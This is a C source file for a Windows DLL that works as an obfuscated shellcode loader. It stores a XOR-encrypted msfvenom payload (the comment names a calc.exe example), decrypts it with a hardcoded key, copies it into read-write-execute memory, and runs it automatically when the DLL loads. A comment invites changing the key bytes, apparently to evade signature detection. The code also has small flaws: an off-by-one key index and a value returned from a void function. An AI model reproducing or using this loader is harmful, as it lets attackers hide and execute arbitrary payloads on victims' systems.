#include <Windows.h>
#include <stdio.h>

// XOR Encrypted Shellcode stored in the Data_RawData[] array
// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
unsigned char Data_RawData[] = {
	// ... (encrypted shellcode bytes)
	0x56, 0xf3, 0x4f, 0x39, 0x1e, 0xe8, 0x6a, 0xbb, 0xcc, 0xdd, 0xaf, 0x51, 0xeb, 0xeb, 0x9e, 0x8c,
	0xb8, 0x48, 0x9b, 0x69, 0xa9, 0x95, 0x65, 0x52, 0xca, 0xf3, 0x47, 0x8f, 0xf6, 0x48, 0x21, 0xe9,
	0xec, 0x95, 0x65, 0x72, 0xfa, 0xf3, 0xc3, 0x6a, 0xa4, 0x4a, 0xe7, 0x8a, 0x05, 0x95, 0xdf, 0xc0,
	0x06, 0x87, 0xad, 0xa1, 0xec, 0x2c, 0x8a, 0xfa, 0x0d, 0x14, 0xe3, 0x41, 0xab, 0x7a, 0x2e, 0x30,
	0xbc, 0x41, 0xfb, 0xf3, 0x47, 0x8f, 0xce, 0x8b, 0xe8, 0x87, 0x84, 0xdc, 0x3e, 0x8b, 0x2a, 0x33,
	0xcc, 0xdd, 0xee, 0x48, 0x2f, 0x7b, 0xb8, 0xba, 0xa6, 0x01, 0x7a, 0xeb, 0x47, 0x95, 0xf6, 0x44,
	0x21, 0xfb, 0xec, 0x94, 0xef, 0xd0, 0x49, 0xed, 0x84, 0x22, 0x27, 0x41, 0x21, 0x8f, 0x44, 0x95,
	0xef, 0xd6, 0xe7, 0x8a, 0x05, 0x95, 0xdf, 0xc0, 0x06, 0xfa, 0x0d, 0x14, 0xe3, 0x41, 0xab, 0x7a,
	0xf4, 0x3d, 0x9b, 0xf1, 0xe6, 0xb8, 0x80, 0xf9, 0xe6, 0x45, 0x93, 0x6a, 0xb9, 0x05, 0xb6, 0x44,
	0x21, 0xfb, 0xe8, 0x94, 0xef, 0xd0, 0xcc, 0xfa, 0x47, 0xd1, 0xa6, 0x44, 0x21, 0xfb, 0xd0, 0x94,
	0xef, 0xd0, 0xeb, 0x30, 0xc8, 0x55, 0xa6, 0x01, 0x7a, 0xfa, 0x94, 0x9c, 0xb6, 0x5e, 0xf3, 0xe1,
	0x8d, 0x85, 0xaf, 0x59, 0xeb, 0xe1, 0x84, 0x5e, 0x02, 0x20, 0xeb, 0xe9, 0x33, 0x3d, 0xb6, 0x41,
	0xf3, 0xe1, 0x84, 0x56, 0xfc, 0xe9, 0xfd, 0x44, 0x33, 0x22, 0xb3, 0x48, 0x10, 0xba, 0xcc, 0xdd,
	0xee, 0x00, 0xaa, 0xbb, 0xcc, 0x95, 0x63, 0x8d, 0xab, 0xba, 0xcc, 0xdd, 0xaf, 0xba, 0x9b, 0x30,
	0xa3, 0x5a, 0x11, 0xd5, 0x11, 0x5b, 0xd1, 0xf7, 0xe4, 0x41, 0x10, 0x1d, 0x59, 0x60, 0x73, 0xff,
	0x7f, 0xf3, 0x4f, 0x19, 0xc6, 0x3c, 0xac, 0xc7, 0xc6, 0x5d, 0x15, 0xe0, 0xdf, 0xbe, 0x77, 0x9a,
	0xfd, 0x72, 0xc5, 0xd1, 0xcc, 0x84, 0xaf, 0x89, 0x70, 0x44, 0x19, 0xbe, 0x8f, 0x6c, 0xc9, 0xbb
};


// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

VOID Decrypt() {
	XorFunction(Data_RawData, sizeof(Data_RawData), randomKey, sizeof(randomKey));

	// Allocate a buffer for the shellcode to make it executable
	PVOID executableBuffer = VirtualAlloc(NULL, sizeof(Data_RawData), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (executableBuffer == NULL) {
		printf("Failed to allocate executable buffer.\n");
		return 1;
	}

	memcpy(executableBuffer, Data_RawData, sizeof(Data_RawData));
	(*(VOID(*)()) executableBuffer)();

	VirtualFree(executableBuffer, 0, MEM_RELEASE);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

    switch (dwReason) {
    case DLL_PROCESS_ATTACH: {
        Decrypt();
        break;
    };
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
